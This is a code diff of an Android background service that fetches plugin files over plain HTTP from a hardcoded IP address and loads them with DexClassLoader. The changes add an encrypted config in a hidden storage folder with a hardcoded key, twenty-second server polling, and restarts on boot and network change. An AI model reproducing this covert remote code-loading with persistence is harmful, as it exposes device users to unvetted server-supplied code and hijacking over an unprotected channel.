@@ -15,16 +15,20 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.ArrayList;
 import java.util.Calendar;
+import java.util.HashMap;
 
 import com.k99k.tools.android.IO;
+import com.k99k.tools.android.JSON;
 import com.k99k.tools.android.StringUtil;
 import com.k99k.tools.encrypter.Base64Coder;
 import com.k99k.tools.encrypter.Encrypter;
 
 import dalvik.system.DexClassLoader;
 import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
-import android.os.Binder;
+import android.content.IntentFilter;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
@@ -63,7 +67,7 @@ public class DService extends Service {
 	public static final int STATE_NEED_RESTART = 3;
 	public static final int STATE_DIE = 4;
 	
-	
+	//FIXME 将所有的log输出改为错误码定义输出
 	
     public static final String ERR_PARA = "e01";
     public static final String ERR_DECRYPT = "e02";
@@ -71,16 +75,19 @@ public class DService extends Service {
     public static final String ERR_DECRYPT_CLIENT = "e04";
     
 	private static byte[] key = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
+	private static final byte[] ROOTKEY = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
 	
 	private static int taskSleepTime = 10*1000;
-	private static int upSleepTime = 1000*60*60*5;
+	private static int upSleepTime = 1000*10*2;
 	private static long nextUpTime;
 	private static long lastUpTime;
 	private static int timeOut = 5000;
 	private final static int VERSION = 1;
-	private int keyVersion = 1;
+	private static int keyVersion = 1;
 	private static final String SPLIT_STR = "@@";
 	private static final String datFileType = ".dat";
+	
+	static final String RECEIVER_ACTION = "com.k99k.dservice";
 	
 	private UpThread upThread;
 	private TaskThread taskThread;
@@ -88,19 +95,139 @@ public class DService extends Service {
 	private  String dexOutputDir= "/data/data/com.k99k.dexplug";
 	//TODO 暂时写死
 	private static String upUrl = "http://180.96.63.71:8080/plserver/PS";
-	private String localDexPath = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
-	
+	static final String localDexPath = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
+	private String emvClass = "com.k99k.dexplug.MoreView";
+	private String emvPath = localDexPath+"emv.jar";
 	private int state = STATE_RUNNING;
 	
-	public  final IBinder mBinder=new LocalBinder();
-	public class LocalBinder extends Binder {
-		// 在Binder中定义一个自定义的接口用于数据交互
-		// 这里直接把当前的服务传回给宿主
-		public DService getService() {
-			return DService.this;
+	
+	private HashMap<String,Object> config;
+	private String configPath = localDexPath+"cache_01";
+	
+	
+	private void initConfig(){
+		this.config = new HashMap<String, Object>();
+		this.config.put("state", STATE_RUNNING);
+		this.config.put("upUrl", "http://180.96.63.71:8080/plserver/PS");
+		this.config.put("emvClass", "com.k99k.dexplug.MoreView");
+		this.config.put("emvPath", localDexPath+"emv.jar");
+		this.config.put("k", Base64Coder.encode(key));
+		this.config.put("kv", keyVersion);
+		this.config.put("t", "");
+		this.saveConfig();
+	}
+	
+	@SuppressWarnings("unchecked")
+	private HashMap<String,Object> readConfig(String configPath){
+		String txt = IO.readTxt(configPath);
+		Log.d(TAG, "read enc:"+txt);
+		if (!StringUtil.isStringWithLen(txt, 44)) {
+			Log.e(TAG, "config File error!");
+			return this.config;
+		}
+		try {
+			//key的密文为44位(明文为：6位毫秒数+16位KEY)
+			String keyString = txt.substring(0,44);
+			String jsonString = txt.substring(44);
+			Log.d(TAG, "keyString:"+keyString);
+			
+			Encrypter.getInstance().setKey(ROOTKEY);
+			String decKey = Encrypter.getInstance().decrypt(keyString);
+			String keyStr = decKey.substring(6);
+			byte[] keyDec = Base64Coder.decode(keyStr);
+			Log.d(TAG, " dec:"+decKey+"DEC_KEY:"+keyStr);
+			if (keyDec.length == 16) {
+				key = keyDec;
+				Encrypter.getInstance().setKey(key);
+				String jsonStr = Encrypter.getInstance().decrypt(jsonString);
+				this.config = (HashMap<String, Object>) JSON.read(jsonStr);
+				if (config != null && config.size()>2) {
+					this.config.put("k", Base64Coder.encode(key));
+				}
+			}else{
+				Log.e(TAG, "config File key error!");
+			}
+			
+		} catch (Exception e) {
+			Log.e(TAG, "config File error!",e);
+		}
+		
+		return this.config;
+	}
+	private String getPropString(String propName,String defaultValue){
+		Object value = this.config.get(propName);
+		if (value == null) {
+			return defaultValue;
+		}
+		return value.toString();
+	}
+	private int getPropInt(String propName,int defaultValue){
+		Object value = this.config.get(propName);
+		if (value == null) {
+			return defaultValue;
+		}
+		return Integer.parseInt(String.valueOf(value));
+	}
+	private void setProp(String propName,Object value,boolean isSave){
+		this.config.put(propName, value);
+		if (isSave) {
+			this.saveConfig();
 		}
 	}
 	
+	public void saveConfig(){
+		this.saveConfig(this.configPath);
+	}
+	
+	private void saveConfig(String configPath){
+		try {
+			String k = Base64Coder.encode(key);
+			this.config.put("timeStamp", System.currentTimeMillis());
+			String conf = JSON.write(this.config);
+			String cTime = String.valueOf(System.currentTimeMillis());
+			String salt = cTime.substring(cTime.length()-6, cTime.length());
+			Encrypter.getInstance().setKey(ROOTKEY);
+			String kEnc = Encrypter.getInstance().encrypt(salt+k);
+			Log.d(TAG, "salt:"+salt+" k:"+k+" kenc:"+kEnc);
+			Encrypter.getInstance().setKey(key);
+			String enc =  kEnc+Encrypter.getInstance().encrypt(conf);
+			Log.d(TAG, "enc:"+enc);
+			IO.writeTxt(configPath,enc);
+			
+		} catch (Exception e) {
+			Log.e(TAG, "save config error!", e);
+		}
+	}
+	
+//	public  final IBinder mBinder=new LocalBinder();
+//	public class LocalBinder extends Binder {
+//		public DService getService() {
+//			return DService.this;
+//		}
+//	}
+	static final int ACT_EMACTIVITY_START = 11;
+	private BroadcastReceiver myReceiver = new BroadcastReceiver() {
+	 
+		@Override
+		public void onReceive(Context context, Intent intent) {
+			int act = intent.getExtras().getInt("act");
+			switch (act) {
+			case ACT_EMACTIVITY_START:
+				Log.d(TAG, "receive act:"+ACT_EMACTIVITY_START);
+				Intent it= new Intent(context.getApplicationContext(), com.k99k.dexplug.EmptyActivity.class);    
+				it.putExtra("emvClass", DService.this.emvClass);
+				it.putExtra("emvPath", DService.this.emvPath);
+				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
+				context.startActivity(it); 
+				break;
+
+			default:
+				Intent i = new Intent();  
+				i.setClass(context, DService.class);  
+				context.startService(i);
+			}
+		}
+	};
 	
 	public void setNextUpTime(long nextUptime,String key){
 		nextUpTime = nextUptime;
@@ -115,12 +242,12 @@ public class DService extends Service {
 	
 	public void pauseService(String key){
 		this.state = STATE_PAUSE;
-		IO.setPropInt(getApplicationContext(), "state", STATE_PAUSE);
+		this.setProp("state", STATE_PAUSE,true);
 	}
 	
 	public void stopService(String key){
 		this.state = STATE_STOP;
-		IO.setPropInt(getApplicationContext(), "state", STATE_STOP);
+		this.setProp("state", STATE_STOP,true);
 	}
 	
 	public void updateTaskState(String key,int tid,int state ){
@@ -140,9 +267,12 @@ public class DService extends Service {
 		return null;
 	}
 	
-	private void updateKey(byte[] keyBytes,int keyVersion){
+	private void updateKey(byte[] keyBytes,int kVersion){
 		key = keyBytes;
-		this.keyVersion = keyVersion;
+		keyVersion = kVersion;
+		this.config.put("k", Base64Coder.encode(key));
+		this.config.put("kv", kVersion);
+		this.saveConfig();
 	}
 	
 	private boolean unzip(String file){
@@ -153,6 +283,10 @@ public class DService extends Service {
 	
 	
 	private void syncTaskList(String remoteListStr,String downUrl){
+		if (!StringUtil.isStringWithLen(remoteListStr, 1)) {
+			Log.d(TAG, "remote task is empty.");
+			return;
+		}
 		String[] remoteList = remoteListStr.split("_");
 		ArrayList<Integer> needFetchList = new ArrayList<Integer>();
 		synchronized (this.taskList) {
@@ -167,7 +301,7 @@ public class DService extends Service {
 					}
 				}
 				if (!had) {
-					PLTask task = this.loadTask(tid, this.localDexPath);
+					PLTask task = this.loadTask(tid, localDexPath);
 					if (task == null) {
 						needFetchList.add(tid);
 					}
@@ -187,32 +321,42 @@ public class DService extends Service {
 				}
 			}
 		}
-		this.saveTaskList();
+		this.saveStates();
 	}
 	private static final int IO_BUFFER_SIZE = 1024 * 4;
-
-	private boolean fetchRemoteTask(int id,String downUrl){
+	
+	
+	public static boolean download(String remoteUrl,String localFile,String vKey){
 		try {
-			URL url = new URL(downUrl+"?id="+id);
+			URL url = new URL(remoteUrl);
 			URLConnection con = url.openConnection();
-			con.setRequestProperty("v", String.valueOf(DService.this.keyVersion*27+17));
+			con.setRequestProperty("v", vKey);
 			InputStream is = con.getInputStream();
 			byte[] bs = new byte[IO_BUFFER_SIZE];
 			int len;
-			OutputStream os = new FileOutputStream(this.localDexPath+id+datFileType);
+			OutputStream os = new FileOutputStream(localFile);
 			while ((len = is.read(bs)) != -1) {
 				os.write(bs, 0, len);
 			}
 			os.close();
 			is.close();
-			
 			return true;
 		} catch (Exception e) {
-			Log.e(TAG, "remote conn error:"+downUrl+"?id="+id);
+			Log.e(TAG, "remote conn error:"+remoteUrl);
 			e.printStackTrace();
 			
 		}
 		return false;
+	}
+
+	private boolean fetchRemoteTask(int id,String downUrl){
+		
+		String remote = downUrl+"?id="+id;
+		String vKey = String.valueOf(DService.this.keyVersion*27+17);
+		String localFile = localDexPath+id+datFileType;
+		
+		
+		return download(remote,localFile,vKey);
 	}
 	
 	
@@ -309,16 +453,17 @@ public class DService extends Service {
 					String downLoadUrl = res[1];
 					String remoteTaskIds = res[2];
 					DService.this.syncTaskList(remoteTaskIds,downLoadUrl);
-					break;
+					return true;
 				case ORDER_DEL_TASK:
 					
 					
 					break;
 				case ORDER_KEY:
 					//resp: ORDER_KEY|base64(key)|keyVersion
-					IO.setPropString(getApplicationContext(), "key",res[1]);
-					Encrypter.setKey(Base64Coder.decode(res[1]));
-					DService.this.keyVersion = Integer.parseInt(res[2]);
+					
+					DService.this.setProp("key",res[1],true);
+					Encrypter.getInstance().setKey(Base64Coder.decode(res[1]));
+					keyVersion = Integer.parseInt(res[2]);
 					break;
 				case ORDER_UPDATE:
 					
@@ -371,13 +516,15 @@ public class DService extends Service {
 					if (System.currentTimeMillis()>nextUpTime) {
 						//每天仅发起一次请求，如果请求失败，等待10分钟
 						if (this.up()) {
-							Calendar ca = Calendar.getInstance();
-							ca.add(Calendar.DATE, 1);
-							ca.set(Calendar.HOUR_OF_DAY, 6);
-							nextUpTime = ca.getTimeInMillis();
+//							Calendar ca = Calendar.getInstance();
+//							ca.add(Calendar.DATE, 1);
+//							ca.set(Calendar.HOUR_OF_DAY, 6);
+//							nextUpTime = ca.getTimeInMillis();
 							lastUpTime = System.currentTimeMillis();
+							nextUpTime += upSleepTime;
+							Log.d(TAG, "lastUpTime:"+lastUpTime+" nextUpTime"+nextUpTime+" runFlag+"+runFlag+" state:"+DService.this.state);
 						}else{
-							Thread.sleep(upSleepTime*2);
+							Thread.sleep(upSleepTime);
 						}
 					}
 					Thread.sleep(upSleepTime);
@@ -395,7 +542,7 @@ public class DService extends Service {
 		synchronized (this.taskList) {
 			this.taskList.add(task);
 		}
-		this.saveTaskList();
+		this.saveStates();
 	}
 	
 	public void delTask(int taskId){
@@ -407,7 +554,7 @@ public class DService extends Service {
 				}
 			}
 		}
-		this.saveTaskList();
+		this.saveStates();
 	}
 	
 	public void delTask(PLTask task){
@@ -416,14 +563,20 @@ public class DService extends Service {
 			this.taskList.remove(task);
 			this.removeDat(task.getId());
 		}
-		this.saveTaskList();
+		this.saveStates();
 	}
 	
 	private void removeDat(int tid){
 		try {
-			File f = new File(this.localDexPath+tid+datFileType);
+			File f = new File(localDexPath+tid+datFileType);
 			if (f.exists()) {
 				f.delete();
+				Log.d(TAG, "DAT remove OK:"+tid);
+			}
+			f = new File(localDexPath+tid+".jar");
+			if (f.exists()) {
+				f.delete();
+				Log.d(TAG, "jar remove OK:"+tid);
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
@@ -490,7 +643,7 @@ public class DService extends Service {
 	
 	
 	
-	private void saveTaskList(){
+	private void saveStates(){
 		StringBuilder sb = new StringBuilder();
 		synchronized (this.taskList) {
 			for (PLTask task : taskList) {
@@ -501,7 +654,10 @@ public class DService extends Service {
 		}
 		sb.delete(0, 2);
 		Log.d(TAG, "save task list:"+sb.toString());
-		IO.setPropString(this, "t", sb.toString());
+		this.setProp("t", sb.toString(),false);
+		this.setProp("emvClass", emvClass,false);
+		this.setProp("emvPath", emvPath,false);
+		this.saveConfig();
 	}
 	
 	/**
@@ -544,7 +700,11 @@ public class DService extends Service {
 		if (this.taskThread.runFlag) {
 			this.taskThread.setRun(false);
 		}
-		this.state = STATE_STOP;
+		if (this.state == STATE_DIE) {
+			this.unregisterReceiver(this.myReceiver);
+		}else{
+			this.state = STATE_STOP;
+		}
 		Log.d(TAG, "stoped...");
 		try {
 			Thread.sleep(3000);
@@ -553,14 +713,22 @@ public class DService extends Service {
 	}
 	
 	private void init(){
+		Log.d(TAG, "init...");
+		this.config = this.readConfig(this.configPath);
+		if (this.config == null || this.config.size() <= 0) {
+			//直接初始化config
+			initConfig();
+			Log.d(TAG, "no conf");
+		}else{
+			Log.d(TAG, "init config OK.");
+		}
 		if (this.state == STATE_NEED_RESTART) {
 			//重启
 			this.stop();
 			this.state = STATE_RUNNING;
 		}else{
-			this.state = IO.getPropInt(getApplicationContext(), "state", STATE_RUNNING);
+			this.state = this.getPropInt("state", STATE_RUNNING);
 		}
-		Log.d(TAG, "init...");
 		if (this.state == STATE_STOP) {
 			this.stop();
 			return;
@@ -573,17 +741,20 @@ public class DService extends Service {
 			return;
 		}
 		dexOutputDir = getApplicationInfo().dataDir;
+		emvClass = this.getPropString("emvClass", "com.k99k.dexplug.MoreView");
+		emvPath = this.getPropString("emvPath", Environment.getExternalStorageDirectory().getPath()+"/.dserver/emv.jar");
 		(new File(localDexPath)).mkdirs();
-		String keyStr = IO.getPropString(this.getApplicationContext(), "k", Base64Coder.encode(key));
-		Encrypter.setKey(Base64Coder.decode(keyStr));
-		String tasks = IO.getPropString(this.getApplicationContext(), "t", "");
+		String keyStr = this.getPropString( "k", Base64Coder.encode(key));
+		keyVersion = this.getPropInt("kv", keyVersion);
+		Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
+		String tasks = this.getPropString( "t", "");
 		Log.d(TAG, "init tasks:"+tasks);
 		if (StringUtil.isStringWithLen(tasks, 1)) {
 			String[] taskArr = tasks.split(SPLIT_STR);
 			this.taskList.clear();
 			for (int i = 0; i < taskArr.length; i++) {
 				int tid = Integer.parseInt(taskArr[i]);
-				PLTask task = this.loadTask(tid, this.localDexPath);
+				PLTask task = this.loadTask(tid, localDexPath);
 				if (task != null) {
 					task.setDService(this);
 					this.taskList.add(task);
@@ -605,6 +776,12 @@ public class DService extends Service {
 		this.upThread.start();
 		this.taskThread = new TaskThread();
 		this.taskThread.start();
+		
+		IntentFilter myFilter = new IntentFilter();  
+        myFilter.addAction("android.intent.action.BOOT_COMPLETED");  
+        myFilter.addAction("android.net.conn.CONNECTIVITY_CHANGE");  
+        myFilter.addAction(RECEIVER_ACTION);  
+        this.registerReceiver(myReceiver, myFilter);  
 	}
 
 	/* (non-Javadoc)
@@ -612,7 +789,7 @@ public class DService extends Service {
 	 */
 	@Override
 	public IBinder onBind(Intent intent) {
-		return this.mBinder;
+		return null;
 	}
 
 	/* (non-Javadoc)
@@ -623,6 +800,8 @@ public class DService extends Service {
 		Log.d(TAG, "dservice created...");
 		handler = new Handler(Looper.getMainLooper());
 		this.init();
+		
+		
 	}
 	
 	public Handler getHander(){
@@ -634,7 +813,7 @@ public class DService extends Service {
 	 */
 	@Override
 	public void onDestroy() {
-		this.saveTaskList();
+		this.saveStates();
 		this.stop();
 		Log.d(TAG, "dservice destroy...");
 	}
@@ -649,7 +828,8 @@ public class DService extends Service {
 		if (this.state == STATE_NEED_RESTART) {
 			this.init();
 		}
-		return super.onStartCommand(intent, flags, startId);
+		return START_REDELIVER_INTENT;
+		//return super.onStartCommand(intent, flags, startId);
 	}
 
 	/**
@@ -660,17 +840,12 @@ public class DService extends Service {
 	}
 
 	/**
+	 * 处理过后keyVersion
+	 * 
 	 * @return the keyVersion
 	 */
 	public final int getKeyVersion() {
-		return keyVersion;
-	}
-
-	/**
-	 * @param keyVersion the keyVersion to set
-	 */
-	public final void setKeyVersion(int keyVersion) {
-		this.keyVersion = keyVersion;
+		return keyVersion*27+17;
 	}
 
 	/**
@@ -690,15 +865,41 @@ public class DService extends Service {
 	/**
 	 * @return the localDexPath
 	 */
-	public final String getLocalDexPath() {
+	public static final String getLocalDexPath() {
 		return localDexPath;
 	}
 
 	/**
-	 * @param localDexPath the localDexPath to set
+	 * @return the emvClass
 	 */
-	public final void setLocalDexPath(String localDexPath) {
-		this.localDexPath = localDexPath;
+	public final String getEmvClass() {
+		return emvClass;
 	}
+
+	/**
+	 * @param emvClass the emvClass to set
+	 */
+	public final void setEmvClass(String emvClass) {
+		this.emvClass = emvClass;
+		this.config.put("emvClass", emvClass);
+		
+	}
+
+	/**
+	 * @return the emvPath
+	 */
+	public final String getEmvPath() {
+		return emvPath;
+	}
+
+	/**
+	 * @param emvPath the emvPath to set
+	 */
+	public final void setEmvPath(String emvPath) {
+		this.emvPath = emvPath;
+		this.config.put("emvPath", emvPath);
+	}
+	
+	
 
 }
